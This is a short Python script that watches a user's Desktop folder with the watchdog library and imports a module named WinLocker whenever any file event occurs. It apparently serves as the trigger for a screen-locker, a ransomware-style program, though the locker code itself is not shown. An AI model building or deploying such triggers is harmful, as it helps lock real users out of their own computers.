from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from time import sleep


class Handler(FileSystemEventHandler):
    def on_any_event(self, event):
        import WinLocker
        
observer = Observer()
observer.schedule(Handler(), path='C:/Users/LENOVO/Desktop/', recursive=True)
observer.start()

try:
    while True:
        sleep(1000)        
except KeyboardInterrupt:
    observer.stop()
observer.join()

